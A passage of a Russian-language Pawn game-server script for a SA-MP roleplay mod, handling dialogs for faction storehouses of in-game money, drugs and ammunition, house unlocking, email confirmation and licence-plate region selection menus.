			if(till < 0) return ShowPlayerDialog(playerid, D_MAFIA+7, 1, "Взять деньги", "{FFFFFF}Введите количество денег:", "Принять", "Отмена");
			new i = (PI[playerid][pMember] == TEAM_OPG1) ? (6) : (PI[playerid][pMember] == TEAM_RSM) ? (5) : (7);
			if(till > FracBank[i] || till < 0) return SendClientMessage(playerid, COLOR_GREY, "На складе мафии нет столько денег!");
            GiveMoney(playerid, till);
			FracBank[i] -= till;

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_MAFIA" SET yakuzabank=%d,lcnbank=%d,rmbank=%d", FracBank[5], FracBank[6], FracBank[7]);
			mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
			new string[90];
			format(string, 90, "Вы взяли со склада мафии %dр", till);
			SendClientMessage(playerid, COLOR_GREEN, string);
			if(PI[playerid][pSex] == 1) format(string, 90, "%s[%d] взял со склада мафии %iр", GetName(playerid), playerid, till);
			else format(string, 90, "%s[%d] взяла со склада мафии %iр", GetName(playerid), playerid, till);
			SendFMes(PI[playerid][pMember], COLOR_YELLOW2, string);
			return 1;
	    }
	case D_MAFIA+8:
	    {
	        if(!response) return 1;
			new till = 0,newslot;
			if(sscanf(inputtext, "i", till)) return ShowPlayerDialog(playerid, D_MAFIA+8, 1, "Взять наркотики", "{FFFFFF}Введите количество наркотиков:", "Принять", "Отмена");
			new i = (PI[playerid][pMember] == TEAM_OPG1) ? (15) : (PI[playerid][pMember] == TEAM_RSM) ? (16) : (17);
			if(till < 0 || till > DrugsBank[i]) return ShowPlayerDialog(playerid, D_MAFIA+8, 1, "Взять наркотики", "{FFFFFF}Введите количество наркотиков:", "Принять", "Отмена");
			if(CheckMaxVes(playerid,36,till,newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
			GiveItem(playerid, 36, till);
			DrugsBank[i] -= till;

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_MAFIA" SET yakuzadrugs=%d,lcndrugs=%d,rmdrugs=%d", DrugsBank[TEAM_RSM], DrugsBank[TEAM_OPG1], DrugsBank[TEAM_YAK]);
			mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
			new string[90];
			format(string, 90, "Вы взяли со склада мафии наркотики (+%i)", till);
			SendClientMessage(playerid, COLOR_GREEN, string);
			if(PI[playerid][pSex] == 1) format(string, 90, "%s[%d] взял со склада мафии %i гр. наркотиков", GetName(playerid), playerid, till);
			else format(string, 90, "%s[%d] взяла со склада мафии %i гр. наркотиков", GetName(playerid), playerid, till);
			SendFMes(PI[playerid][pMember], COLOR_YELLOW2, string);
			SaveItem(playerid,newslot);
			return 1;
	    }
	case D_GANG:
	    {
	        if(!response) return 1;
	        switch(listitem)
			{
				case 0: ShowPlayerDialog(playerid, D_GANG+1, 1, "Положить патроны", "{FFFFFF}Введите количество патронов:", "Принять", "Отмена");
		  		case 1: ShowPlayerDialog(playerid, D_GANG+3, 1, "Положить деньги", "{FFFFFF}Введите количество денег:", "Принять", "Отмена");
				case 2: ShowPlayerDialog(playerid, D_GANG+4, 1, "Положить наркотики", "{FFFFFF}Введите количество наркотиков:","Принять", "Отмена");
				case 3:
				{
				    if(PI[playerid][pRank] < 4) return SendClientMessage(playerid, COLOR_GREY, "Данная возможность доступна с 4 ранга!");
					ShowPlayerDialog(playerid, D_GANG+5, 1, "Взять патроны", "{FFFFFF}Введите количество патронов:", "Принять", "Отмена");
				}
				case 4:
				{
				    if(!PI[playerid][pLeader]) return SendClientMessage(playerid, COLOR_GREY, "Данная возможность доступна только лидеру!");
					ShowPlayerDialog(playerid, D_GANG+7, 1, "Взять деньги", "{FFFFFF}Введите количество денег:", "Принять", "Отмена");
				}
				case 5:
				{
				    if(PI[playerid][pRank] < 4) return SendClientMessage(playerid, COLOR_GREY, "Данная возможность доступна с 4 ранга!");
					ShowPlayerDialog(playerid, D_GANG+8, 1, "Взять наркотики", "{FFFFFF}Введите количество наркотиков:", "Принять", "Отмена");
				}
		  	}
	    }
	case D_GANG+1:
	    {
	        if(!response) return 1;
			new till = 0,ok;
			if(sscanf(inputtext, "i", till)) return ShowPlayerDialog(playerid, D_GANG+1, 1, "Положить патроны", "{FFFFFF}Введите количество патронов:", "Принять", "Отмена");
			if(till < 0) return ShowPlayerDialog(playerid, D_GANG+1, 1, "Положить патроны", "{FFFFFF}Введите количество патронов:", "Принять", "Отмена");
			for(new s = 16; s > 0; s --)
            {
   				if(PlayerItem1[playerid][s]==27){ok=s;break;}
   			}
			new i = (PI[playerid][pMember] == TEAM_GROOVE) ? (0) : (PI[playerid][pMember] == TEAM_BALLAS) ? (1) : (PI[playerid][pMember] == TEAM_RIFA) ? (2) : (PI[playerid][pMember] == TEAM_OPGTEST2) ? (3) : (4);
			if(PlayerItem2[playerid][ok]<strval(inputtext))return SendClientMessage(playerid,COLOR_GREY,"У Вас нет столько патронов");
			if(PlayerItem2[playerid][ok] == 0)
   			{
   				PlayerItem1[playerid][ok]=0;
   			}
			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_GANG" SET grovepat=%d,ballaspat=%d,rifapat=%d,aztecpat=%d,vagospat=%d", GangPatr[0], GangPatr[1], GangPatr[2], GangPatr[3], GangPatr[4]);
			mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
			GangPatr[i] += till;
   			PlayerItem2[playerid][ok]-=till;
			new string[90];
			format(string, 90, "Вы положили на склад банды патроны (+%i)", till);
			SendClientMessage(playerid, COLOR_GREEN, string);
			if(PI[playerid][pSex] == 1) format(string, 90, "%s[%d] положил на склад банды %i патрон(ов)", GetName(playerid), playerid, till);
			else format(string, 90, "%s[%d] положила на склад банды %i патрон(ов)", GetName(playerid), playerid, till);
			SendFMes(PI[playerid][pMember], COLOR_YELLOW2, string);
			UpDateInv(playerid);
			SaveItem(playerid,ok);
			return 1;
	    }
	case D_GANG+3:
	    {
	        if(!response) return 1;
			new till = 0;
			if(sscanf(inputtext, "i", till)) return ShowPlayerDialog(playerid, D_GANG+3, 1, "Положить деньги", "{FFFFFF}Введите количество денег:", "Принять", "Отмена");
			if(till < 0) return ShowPlayerDialog(playerid, D_GANG+3, 1, "Положить деньги", "{FFFFFF}Введите количество денег:", "Принять", "Отмена");
			if(till > GetMoney(playerid) || till < 0) return SendMess(playerid, MSG_NOT_MONEY);
			new i = (PI[playerid][pMember] == TEAM_GROOVE) ? (0) : (PI[playerid][pMember] == TEAM_BALLAS) ? (1) : (PI[playerid][pMember] == TEAM_RIFA) ? (2) : (PI[playerid][pMember] == TEAM_OPGTEST2) ? (3) : (4);
            GiveMoney(playerid, -till);
			FracBank[i] += till;

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_GANG" SET grovebank=%d,ballasbank=%d,rifabank=%d,aztecbank=%d,vagosbank=%d", FracBank[0], FracBank[1], FracBank[2], FracBank[3], FracBank[4]);
			mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
			new string[90];
			format(string, 90, "Вы положили на склад банды %dр", till);
			SendClientMessage(playerid, COLOR_GREEN, string);
			if(PI[playerid][pSex] == 1) format(string, 90, "%s[%d] положил на склад банды %iр", GetName(playerid), playerid, till);
			else format(string, 90, "%s[%d] положила на склад банды %iр", GetName(playerid), playerid, till);
			SendFMes(PI[playerid][pMember], COLOR_YELLOW2, string);
			return 1;
	    }
    case D_GANG+4:
	    {
	    	if(!response) return 1;
			new till = 0, ok;
			if(sscanf(inputtext, "i", till)) return ShowPlayerDialog(playerid, D_GANG+4, 1, "Положить наркотики", "{FFFFFF}Введите количество наркотиков:","Принять", "Отмена");
			if(till < 0) return ShowPlayerDialog(playerid, D_GANG+4, 1, "Положить наркотики", "{FFFFFF}Введите количество наркотиков:","Принять", "Отмена");
			new i = (PI[playerid][pMember] == TEAM_GROOVE) ? (7) : (PI[playerid][pMember] == TEAM_BALLAS) ? (8) : (PI[playerid][pMember] == TEAM_RIFA) ? (9) : (PI[playerid][pMember] == TEAM_OPGTEST2) ? (10) : (11);
            for(new s = 16; s > 0; s --)
            {
   				if(PlayerItem1[playerid][s]==44){ok=s;break;}
   			}
			if(PlayerItem2[playerid][ok]<strval(inputtext))return SendClientMessage(playerid,COLOR_GREY,"У Вас нет столько наркотиков");
			if(PlayerItem2[playerid][ok] == 0)
   			{
   				PlayerItem1[playerid][ok]=0;
   			}
			PlayerItem2[playerid][ok]-=till;
			DrugsBank[i] += till;

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_GANG" SET grovedrugs=%d,ballasdrugs=%d,rifadrugs=%d,aztecdrugs=%d,vagosdrugs=%d", DrugsBank[TEAM_GROOVE], DrugsBank[TEAM_BALLAS], DrugsBank[TEAM_RIFA], DrugsBank[TEAM_OPGTEST2], DrugsBank[TEAM_VAGOS]);
			mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
			new string[90];
			format(string, 90, "Вы положили на склад банды наркотики (+%i)", till);
			SendClientMessage(playerid, COLOR_GREEN, string);
			if(PI[playerid][pSex] == 1) format(string, 90, "%s[%d] положил на склад банды %i пакетик(а) наркотиков", GetName(playerid), playerid, till);
			else format(string, 90, "%s[%d] положила на склад банды %i пакетик(а) наркотиков", GetName(playerid), playerid, till);
			SendFMes(PI[playerid][pMember], COLOR_YELLOW2, string);
			UpDateInv(playerid);
			SaveItem(playerid,ok);
			return 1;
		}
	case D_GANG+5:
	    {
	        if(!response) return 1;
			new till = 0, newslot;
			if(sscanf(inputtext, "i", till)) return ShowPlayerDialog(playerid, D_GANG+5, 1, "Взять патроны", "{FFFFFF}Введите количество патронов:", "Принять", "Отмена");
			new i = (PI[playerid][pMember] == TEAM_GROOVE) ? (0) : (PI[playerid][pMember] == TEAM_BALLAS) ? (1) : (PI[playerid][pMember] == TEAM_RIFA) ? (2) : (PI[playerid][pMember] == TEAM_OPGTEST2) ? (3) : (4);
			if(till < 0 || till > GangPatr[i]) return ShowPlayerDialog(playerid, D_GANG+5, 1, "Взять патроны", "{FFFFFF}Введите количество патронов:", "Принять", "Отмена");
			if(CheckMaxVes(playerid,27,till,newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
			GiveItem(playerid, 27, till);
			GangPatr[i] -= till;

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_GANG" SET grovepat=%d,ballaspat=%d,rifapat=%d,aztecpat=%d,vagospat=%d", GangPatr[0], GangPatr[1], GangPatr[2], GangPatr[3], GangPatr[4]);
			mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
			new string[90];
			format(string, 90, "Вы взяли со склада банды патроны (+%i)", till);
			SendClientMessage(playerid, COLOR_GREEN, string);
			if(PI[playerid][pSex] == 1) format(string, 90, "%s[%d] взял со склада банды %i патрон", GetName(playerid), playerid, till);
			else format(string, 90, "%s[%d] взяла со склада банды %i патрон", GetName(playerid), playerid, till);
			SendFMes(PI[playerid][pMember], COLOR_YELLOW2, string);
			SaveItem(playerid,newslot);
			return 1;
	    }
	case D_GANG+7:
	    {
	        if(!response) return 1;
			new till = 0;
			if(sscanf(inputtext, "i", till)) return ShowPlayerDialog(playerid, D_GANG+7, 1, "Взять деньги", "{FFFFFF}Введите количество денег:", "Принять", "Отмена");
			if(till < 0) return ShowPlayerDialog(playerid, D_GANG+7, 1, "Взять деньги", "{FFFFFF}Введите количество денег:", "Принять", "Отмена");
			new i = (PI[playerid][pMember] == TEAM_GROOVE) ? (0) : (PI[playerid][pMember] == TEAM_BALLAS) ? (1) : (PI[playerid][pMember] == TEAM_RIFA) ? (2) : (PI[playerid][pMember] == TEAM_OPGTEST2) ? (3) : (4);
			if(till > FracBank[i] || till < 0) return SendClientMessage(playerid, COLOR_GREY, "На складе банды нет столько денег!");
            GiveMoney(playerid, till);
			FracBank[i] -= till;

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_GANG" SET grovebank=%d,ballasbank=%d,rifabank=%d,aztecbank=%d,vagosbank=%d", FracBank[0], FracBank[1], FracBank[2], FracBank[3], FracBank[4]);
			mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
			new string[90];
			format(string, 90, "Вы взяли со склада банды %dр", till);
			SendClientMessage(playerid, COLOR_GREEN, string);
			if(PI[playerid][pSex] == 1) format(string, 90, "%s[%d] взял со склада банды %iр", GetName(playerid), playerid, till);
			else format(string, 90, "%s[%d] взяла со склада банды %iр", GetName(playerid), playerid, till);
			SendFMes(PI[playerid][pMember], COLOR_YELLOW2, string);
			return 1;
	    }
	case D_GANG+8:
	    {
	        if(!response) return 1;
			new till = 0, newslot;
			if(sscanf(inputtext, "i", till)) return ShowPlayerDialog(playerid, D_GANG+8, 1, "Взять наркотики", "{FFFFFF}Введите количество наркотиков:", "Принять", "Отмена");
			new i = (PI[playerid][pMember] == TEAM_GROOVE) ? (7) : (PI[playerid][pMember] == TEAM_BALLAS) ? (8) : (PI[playerid][pMember] == TEAM_RIFA) ? (9) : (PI[playerid][pMember] == TEAM_OPGTEST2) ? (10) : (11);
			if(till < 0 || till > DrugsBank[i]) return ShowPlayerDialog(playerid, D_GANG+8, 1, "Взять наркотики", "{FFFFFF}Введите количество наркотиков:", "Принять", "Отмена");
			if(CheckMaxVes(playerid,44,till,newslot)==1)return SendClientMessage(playerid,COLOR_GREY,"У Вас нет свободного места в инвентаре!");
			PlayerItem1[playerid][newslot]=44;
			PlayerItem2[playerid][newslot]+=till;
			DrugsBank[i] -= till;

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_GANG" SET grovedrugs=%d,ballasdrugs=%d,rifadrugs=%d,aztecdrugs=%d,vagosdrugs=%d", DrugsBank[TEAM_GROOVE], DrugsBank[TEAM_BALLAS], DrugsBank[TEAM_RIFA], DrugsBank[TEAM_OPGTEST2], DrugsBank[TEAM_VAGOS]);
			mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
			new string[90];
			format(string, 90, "Вы взяли со склада банды наркотики (+%i)", till);
			SendClientMessage(playerid, COLOR_GREEN, string);
			if(PI[playerid][pSex] == 1) format(string, 90, "%s[%d] взял со склада банды %i гр. наркотиков", GetName(playerid), playerid, till);
			else format(string, 90, "%s[%d] взяла со склада банды %i гр. наркотиков", GetName(playerid), playerid, till);
			SendFMes(PI[playerid][pMember], COLOR_YELLOW2, string);
			SaveItem(playerid,newslot);
			return 1;
	    }
	case D_JOB+14:
		{
			if(!response) return 1;
			new i = GetPVarInt(playerid, "PlayerHouse");
			HouseInfo[i][hLock] = 0;
			PlayerPlaySound(playerid, 1145, 0.0, 0.0, 0.0);
			GameTextForPlayer(playerid, "~g~unlock", 5000, 5);
			MeAction(playerid, "открывает замок дома");
			MysqlUpdateHouseInt(i, "hLock", HouseInfo[i][hLock]);
			FreezePlayer(playerid, 5000);
			SetPlayerPos(playerid,HouseInfo[i][hExitx],HouseInfo[i][hExity],HouseInfo[i][hExitz]);
			SetPlayerInterior(playerid,HouseInfo[i][hInt]);
			SetPlayerVirtualWorld(playerid,HouseInfo[i][hVirtual]);
			return 1;
		}
	case D_MAIL:
	    {
	        if(!response) return 1;
	        new	code = RandomEx(10000,99999);
			new string[300];
			format(string, sizeof(string), "%s?authkey=%s&email=%s&code=%d", EMAIL_ACTIVE, EMAIL_AUTHKEY, PI[playerid][pMail], code);
			new result = HTTP(0, HTTP_HEAD, string, "","");
			SetPVarInt(playerid, "authcode", code);
			if(!result) return SendClientMessage(playerid, COLOR_RED, "Произошла ошибка при http запросе");
			ShowPlayerDialog(playerid, D_MAIL+1, DIALOG_STYLE_INPUT, "Потверждение почты", "{FFFFFF}Используйте сюда код который пришёл Вам на почту", "Принять", "Закрыть");
	    }
	case D_MAIL+1:
	    {
	        if(!response) return 1;
	        if(isNumeric(inputtext) || !strlen(inputtext)) return ShowPlayerDialog(playerid, D_MAIL+1, DIALOG_STYLE_INPUT, "Потверждение почты", "{FFFFFF}Используйте сюда код который пришёл Вам на почту", "Принять", "Закрыть");
		    if(GetPVarInt(playerid,"authcode") != strval(inputtext)) return ShowPlayerDialog(playerid, D_MAIL+1, DIALOG_STYLE_INPUT, "Потверждение почты", "{FFFFFF}Используйте сюда код который пришёл Вам на почту\n\n{FF0000}Неверный код, потвердите попытку ввода", "Принять", "Закрыть");
			SendMes(playerid, COLOR_YELLOW, "Вы успешно потвердили свою почту {FFFFFF}'%s'", PI[playerid][pMail]);
			PI[playerid][pMailConfirmed] = 1;
			MysqlUpdatePlayerInt(playerid, "mailconf", PI[playerid][pMailConfirmed]);
			DeletePVar(playerid, "authcode");
	    }
  	case D_BUYNUMBER:
 		{
			//if(!response) return ShowPlayerDialog(playerid, D_BUYNUMBER, DIALOG_STYLE_LIST, "Выберите страну", "{FFCC00}1.{ffffff} Номера RUS\t{FFCC00}10000р\n{FFCC00}2.{ffffff} Номера BY\t\t{FFCC00}10000р\n{FFCC00}3.{ffffff} Номера UA\t\t{FFCC00}10000р\n{FFCC00}4.{ffffff} Номера KZ\t\t{FFCC00}10000р", "Далее", "Отмена");
            if(!response) return 1;
		    switch(listitem)
		    {
 	        case 0:
				{
					SetPVarInt(playerid, "TypeNumber", 2);
					ShowPlayerDialog(playerid, D_VEHNUMBER+3, DIALOG_STYLE_LIST, "{f6e58d}Выбор региона:",
					"{ffffff}01\tРеспублика Адыгея\n\
					{ffffff}02\tРеспублика Башкортостан\n\
					{ffffff}03\tРеспублика Бурятия\n\
					{ffffff}04\tРеспублика Алтай\n\
					{ffffff}05\tРеспублика Дагестан\n\
					{ffffff}06\tРеспублика Ингушетия\n\
					{ffffff}07\tКабардино-Балкарская Республика\n\
					{ffffff}08\tРеспублика Калмыкия\n\
					{ffffff}09\tКарачаево-Черкесская Республика\n\
					{ffffff}10\tРеспублика Карелия\n\
					{ffffff}11\tРеспублика Коми\n\
					{ffffff}12\tРеспублика Марый Эл\n\
					{ffffff}13\tРеспублика Мордовия\n\
					{ffffff}14\tРеспублика Саха (Якутия)\n\
					{ffffff}15\tРеспублика Северная Осетия\n\
					{ffffff}16\tРеспублика Татарстан\n\
					{ffffff}17\tРеспублика Тыва (Тува)\n\
					{ffffff}18\tУдмуртская Республика\n\
					{ffffff}19\tРеспублика Хакасия\n\
					{ffffff}20\tЧеченская Республика\n\
					{ffffff}21\tЧувашская Республика\n\
					{ffffff}22\tАлтайский край\n\
					{ffffff}23\tКраснодарский край\n\
					{ffffff}24\tКрасноярский край\n\
					{ffffff}25\tПриморский край\n\
					{ffffff}26\tСтавропольский край\n\
					{ffffff}27\tХабаровский край\n\
					{ffffff}28\tАмурская область\n\
					{ffffff}29\tАрхангельская область\n\
					{ffffff}30\tАстраханская область\n\
					{ffffff}31\tБелгородская область\n\
					{ffffff}32\tБрянская область\n\
					{ffffff}33\tВладимирская область\n\
					{ffffff}34\tВолгоградская область\n\
					{ffffff}35\tВологодская область\n\
					{ffffff}36\tВоронежская область\n\
					{ffffff}37\tИвановская область\n\
					{ffffff}38\tИркутская область\n\
					{ffffff}39\tКалининградская область\n\
					{ffffff}40\tКалужская область\n\
					{ffffff}41\tКамчатская область\n\
					{ffffff}42\tКемеровская область\n\
					{ffffff}43\tКировская область\n\
					{ffffff}44\tКостромская область\n\
					{ffffff}45\tКурганская область\n\
					{ffffff}46\tКурская область\n\
					{ffffff}47\tЛенинградская область\n\
					{ffffff}48\tЛипецкая область\n\
					{ffffff}49\tМагаданская область\n\
					{ffffff}50\tМосковская область\n\
					{ffffff}51\tМурманская область\n\
					{ffffff}52\tНижегородская область\n\
					{ffffff}53\tНовгородская область\n\
					{ffffff}54\tНовосибирская область\n\
					{ffffff}55\tОмская область\n\
					{ffffff}56\tОренбургская область\n\
					{ffffff}57\tОрловская область\n\
					{ffffff}58\tПензенская област\n\
					{ffffff}59\tПермская область\n\
					{ffffff}60\tПсковская область\n\
					{ffffff}61\tРостовская область\n\
					{ffffff}62\tРязанская область\n\
					{ffffff}63\tСамарская область\n\
					{ffffff}64\tСаратовская область\n\
					{ffffff}65\tСахалинская область\n\
					{ffffff}66\tСвердловская область\n\
					{ffffff}67\tСмоленская область\n\
					{ffffff}68\tТамбовская область\n\
					{ffffff}69\tТверская область\n\
					{ffffff}70\tТомская область\n\
					{ffffff}71\tТульская область\n\
					{ffffff}72\tТюменская область\n\
					{ffffff}73\tУльяновская область\n\
					{ffffff}74\tЧелябинская область\n\
					{ffffff}75\tЧитинская область\n\
					{ffffff}76\tЯрославская область\n\
					{ffffff}77\tг. Москва\n\
					{ffffff}78\tг. Санкт-Петербург\n\
					{ffffff}79\tЕврейская автономная область\n\
					{ffffff}80\tАгинский Бурятский автономный округ\n\
					{ffffff}81\tКоми-Пермяцкий автономный округ\n\
					{ffffff}82\tКорякский автономный округ\n\
					{ffffff}83\tНенецкий автономнь округ\n\
					{ffffff}84\tТаймырский автономный округ\n\
					{ffffff}85\tУсть-Ордынский Бурятский автономный округ\n\
					{ffffff}86\tХанты-Мансийский автономный округ\n\
					{ffffff}87\tЧукотский автономный округ\n\
					{ffffff}88\tЭвенкийский автономный округ\n\
					{ffffff}89\tЯмало-Ненецкий автономный округ\n\
					{ffffff}90\tМосковская область\n\
					{ffffff}92\tСевастополь\n\
					{ffffff}93\tКраснодарский край\n\
					{ffffff}95\tЧеченская Республика\n\
					{ffffff}96\tСвердловская область\n\
					{ffffff}97\tг. Москва\n\
					{ffffff}98\tг. Санкт-Петербург\n\
					{ffffff}99\tг. Москва\n\
					{ffffff}102\tРеспублика Башкортостан\n\
					{ffffff}116\tРеспублика Татарстан\n\
					{ffffff}118\tУдмуртская Республика\n\
					{ffffff}121\tЧувашская Республика\n\
					{ffffff}123\tКраснодарский край\n\
					{ffffff}125\tПриморский край\n\
					{ffffff}138\tИркутская область\n\
					{ffffff}150\tМосковская область\n\
					{ffffff}152\tНижегородская область\n\
					{ffffff}154\tНовосибирская область\n\
					{ffffff}159\tПермская область\n\
					{ffffff}161\tРостовская область\n\
					{ffffff}163\tСамарская область\n\
					{ffffff}164\tСаратовская область\n\
					{ffffff}173\tУльяновская область\n\
					{ffffff}174\tЧелябинская область\n\
					{ffffff}177\tг. Москва\n\
					{ffffff}182\tКрым\n\
					{ffffff}197\tг. Москва\n\
					{ffffff}199\tг. Москва\n\
					{FFCC00}Вперед", "Далее", "Отмена");
				}
    			case 1:
				{
				    SetPVarInt(playerid, "TypeNumber", 5);
					ShowPlayerDialog(playerid, D_VEHNUMBER+2, DIALOG_STYLE_LIST, "{f6e58d}Выбор региона:",
					"{ffffff}1\tБрестская область\n\
					{ffffff}2\tВитебская область\n\
					{ffffff}3\tГомельская область\n\
					{ffffff}4\tГродненская область\n\
					{ffffff}5\tМинская область\n\
					{ffffff}6\tМогилёвская область\n\
					{ffffff}7\tг. Минск", "Далее", "Отмена");
				}
    			case 2:
				{
				    SetPVarInt(playerid, "TypeNumber", 6);
					ShowPlayerDialog(playerid, D_VEHNUMBER+5, DIALOG_STYLE_LIST, "{f6e58d}Выбор региона:",
					"{ffffff}AB\tВинницкая область\n\
					{ffffff}AC\tВолыiнская область\n\
					{ffffff}AE\tДнепропетровская область\n\
					{ffffff}AH\tДонецкая область\n\
					{ffffff}AM\tЖитомирская область\n\
					{ffffff}AO\tЗакарпатская область\n\
					{ffffff}AP\tЗапорожская область\n\
					{ffffff}AT\tИвано-Франковская область\n\
					{ffffff}AA\tКиев\n\
					{ffffff}AI\tКиевская область\n\
					{ffffff}BA\tКировоградская область\n\
					{ffffff}BB\tЛуганская область\n\
					{ffffff}BC\tЛьвовская область\n\
					{ffffff}BE\tНиколаевская область\n\
					{ffffff}BH\tОдесская область\n\
					{ffffff}BI\tПолтавская область\n\
					{ffffff}BK\tРовенская область\n\
					{ffffff}BM\tСумская область\n\
					{ffffff}BO\tТернопольская область\n\
					{ffffff}AX\tХарьковская область\n\
					{ffffff}BT\tХерсонская область\n\
					{ffffff}BX\tХмельницкая область\n\
					{ffffff}CA\tЧеркасская область\n\
					{ffffff}CB\tЧерниговская область\n\
					{ffffff}CE\tЧерновицкая область", "Далее", "Отмена");
				}
    			case 3:
				{
				    SetPVarInt(playerid, "TypeNumber", 7);
					ShowPlayerDialog(playerid,D_VEHNUMBER+4,DIALOG_STYLE_LIST,"{F5E911}Выбор региона:",
					"{ffffff}01\tг. Астана\n\
					{ffffff}02\tг. Алматы\n\
					{ffffff}03\tАкмолинская область\n\
					{ffffff}04\tАктюбинская область\n\
					{ffffff}05\tАлматинская область\n\
					{ffffff}06\tАтырауская область\n\
					{ffffff}07\tЗападно-Казахстанская область\n\
					{ffffff}08\tЖамбылская область\n\
					{ffffff}09\tКарагандинская область\n\
					{ffffff}10\tКостанайская область\n\
					{ffffff}11\tКызыл-Ординская область\n\
					{ffffff}12\tМангистауская область\n\
					{ffffff}13\tЮжно-Казахстанская область\n\
					{ffffff}14\tПавлодарская область\n\
					{ffffff}15\tСеверо-Казахстанская область\n\
					{ffffff}16\tВосточно-Казахстанская область","Далее","Отмена");
				}
			}
 		}
	case D_VEHNUMBER+3:
	{
		if(response)
		{
		    switch(listitem)
		    {
				case 0: SetPVarInt(playerid, "Region", 1);
				case 1: SetPVarInt(playerid, "Region", 2);
				case 2: SetPVarInt(playerid, "Region", 3);
				case 3: SetPVarInt(playerid, "Region", 4);
				case 4: SetPVarInt(playerid, "Region", 5);
				case 5: SetPVarInt(playerid, "Region", 6);
				case 6: SetPVarInt(playerid, "Region", 7);
				case 7: SetPVarInt(playerid, "Region", 8);
				case 8: SetPVarInt(playerid, "Region", 9);
				case 9: SetPVarInt(playerid, "Region", 10);
				case 10: SetPVarInt(playerid, "Region", 11);
				case 11: SetPVarInt(playerid, "Region", 12);
				case 12: SetPVarInt(playerid, "Region", 13);
				case 13: SetPVarInt(playerid, "Region", 14);
				case 14: SetPVarInt(playerid, "Region", 15);
				case 15: SetPVarInt(playerid, "Region", 16);
				case 16: SetPVarInt(playerid, "Region", 17);
				case 17: SetPVarInt(playerid, "Region", 18);
				case 18: SetPVarInt(playerid, "Region", 19);
				case 19: SetPVarInt(playerid, "Region", 20);
				case 20: SetPVarInt(playerid, "Region", 21);
				case 21: SetPVarInt(playerid, "Region", 22);
				case 22: SetPVarInt(playerid, "Region", 23);
				case 23: SetPVarInt(playerid, "Region", 24);
				case 24: SetPVarInt(playerid, "Region", 25);
				case 25: SetPVarInt(playerid, "Region", 26);
				case 26: SetPVarInt(playerid, "Region", 27);
				case 27: SetPVarInt(playerid, "Region", 28);
				case 28: SetPVarInt(playerid, "Region", 29);
				case 29: SetPVarInt(playerid, "Region", 30);
				case 30: SetPVarInt(playerid, "Region", 31);
				case 31: SetPVarInt(playerid, "Region", 32);
				case 32: SetPVarInt(playerid, "Region", 33);
				case 33: SetPVarInt(playerid, "Region", 34);
				case 34: SetPVarInt(playerid, "Region", 35);
				case 35: SetPVarInt(playerid, "Region", 36);
				case 36: SetPVarInt(playerid, "Region", 37);
				case 37: SetPVarInt(playerid, "Region", 38);
				case 38: SetPVarInt(playerid, "Region", 39);
				case 39: SetPVarInt(playerid, "Region", 40);
				case 40: SetPVarInt(playerid, "Region", 41);
				case 41: SetPVarInt(playerid, "Region", 42);
				case 42: SetPVarInt(playerid, "Region", 43);
				case 43: SetPVarInt(playerid, "Region", 44);
				case 44: SetPVarInt(playerid, "Region", 45);
				case 45: SetPVarInt(playerid, "Region", 46);
				case 46: SetPVarInt(playerid, "Region", 47);
				case 47: SetPVarInt(playerid, "Region", 48);
				case 48: SetPVarInt(playerid, "Region", 49);
				case 49: SetPVarInt(playerid, "Region", 50);
				case 50: SetPVarInt(playerid, "Region", 51);
				case 51: SetPVarInt(playerid, "Region", 52);
				case 52: SetPVarInt(playerid, "Region", 53);
				case 53: SetPVarInt(playerid, "Region", 54);
				case 54: SetPVarInt(playerid, "Region", 55);
				case 55: SetPVarInt(playerid, "Region", 56);
				case 56: SetPVarInt(playerid, "Region", 57);
				case 57: SetPVarInt(playerid, "Region", 58);
				case 58: SetPVarInt(playerid, "Region", 59);
				case 59: SetPVarInt(playerid, "Region", 60);
				case 60: SetPVarInt(playerid, "Region", 61);
				case 61: SetPVarInt(playerid, "Region", 62);
				case 62: SetPVarInt(playerid, "Region", 63);
				case 63: SetPVarInt(playerid, "Region", 64);
				case 64: SetPVarInt(playerid, "Region", 65);
				case 65: SetPVarInt(playerid, "Region", 66);
				case 66: SetPVarInt(playerid, "Region", 67);
				case 67: SetPVarInt(playerid, "Region", 68);
				case 68: SetPVarInt(playerid, "Region", 69);
				case 69: SetPVarInt(playerid, "Region", 70);
				case 70: SetPVarInt(playerid, "Region", 71);
				case 71: SetPVarInt(playerid, "Region", 72);
				case 72: SetPVarInt(playerid, "Region", 73);
				case 73: SetPVarInt(playerid, "Region", 74);
				case 74: SetPVarInt(playerid, "Region", 75);
				case 75: SetPVarInt(playerid, "Region", 76);
				case 76: SetPVarInt(playerid, "Region", 77);
				case 77: SetPVarInt(playerid, "Region", 78);
				case 78: SetPVarInt(playerid, "Region", 79);
				case 79: SetPVarInt(playerid, "Region", 80);
				case 80: SetPVarInt(playerid, "Region", 81);
				case 81: SetPVarInt(playerid, "Region", 82);
				case 82: SetPVarInt(playerid, "Region", 83);
				case 83: SetPVarInt(playerid, "Region", 84);
				case 84: SetPVarInt(playerid, "Region", 85);
				case 85: SetPVarInt(playerid, "Region", 86);
				case 86: SetPVarInt(playerid, "Region", 87);
